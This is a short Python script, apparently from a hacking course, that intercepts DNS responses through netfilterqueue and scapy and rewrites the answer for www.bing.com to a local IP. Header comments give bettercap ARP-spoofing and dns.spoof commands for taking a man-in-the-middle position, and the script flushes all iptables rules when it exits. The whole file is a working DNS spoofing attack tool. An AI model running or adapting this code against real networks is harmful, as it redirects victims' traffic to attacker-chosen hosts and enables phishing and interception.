#!/usr/bin/env python

# service apache2 start

# bettercap -iface eth0 -caplet /root/arp-spoof.cap
# set dns.spoof all true, reply to every DNS request
# set dns.spoof.address [ip], host machine by default
# set dns.spoof.domains
# dns.spoof on

# send ping one request
# ping -c 1 www.bing.com

import netfilterqueue
import subprocess
import optparse
import scapy.all as scapy

def modify_iptables_remote(queue_num):
    # modify iptables to trap all packets in NetFilterQueue(0)
    # request from other computer --> FORWARD
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queue_num])

    print("[+] IPtables modified ... Remote packet trap in queue " + str(queue_num))

def modify_iptables_local(queue_num):
    # modify iptables to trap all packets in NetFilterQueue(0)
    # request from/to host computer --> OUTPUT/INPUT
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queue_num])

    print("[+] IPtables modified ... Local packet trap in queue " + str(queue_num))

def restore_iptables():
    subprocess.call(["iptables", "--flush"])
    print("[+] IPtables restored.")

def process_packet(packet):
    # convert to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # DNSRQ --> request(question record), DNSRR --> response(resource record)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.140.130")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # remove len, chksum, scapy will automatically acculate when sending the packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # python2 --> str, python3 --> bytes
            packet.set_payload(bytes(scapy_packet))
            # packet.set_payload(str(scapy_packet))
        
        # print(packet.get_payload()) --> str
        # print(scapy_packet.show()) --> scapy packet
    packet.accept()

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-n", "--queue_num", dest="queue_num", help="NFQueue number.")
    options, arguments = parser.parse_args()
    if not options.queue_num:
        parser.error("[-] Please specify a queue number, use --help for more info.")
    return options

options = get_arguments()
modify_iptables_local(options.queue_num)
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.queue_num), process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    restore_iptables()